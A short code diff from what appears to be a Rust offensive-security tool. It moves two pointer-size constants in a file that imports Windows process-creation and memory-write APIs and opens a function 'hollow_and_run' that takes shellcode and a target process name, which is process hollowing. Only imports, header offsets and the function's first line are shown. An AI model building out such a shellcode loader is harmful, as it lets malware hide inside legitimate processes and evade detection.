@@ -4,10 +4,10 @@ use windows::core::{PCSTR, PSTR};
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, ResumeThread, STARTUPINFOA};
 
-const POINTER_SIZE: u32 = usize::BITS >> 3;
-const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
+const POINTER_SIZE: u32 = usize::BITS >> 3;
+const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;
 
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty ProcessInformation struct for use in CreateProcess
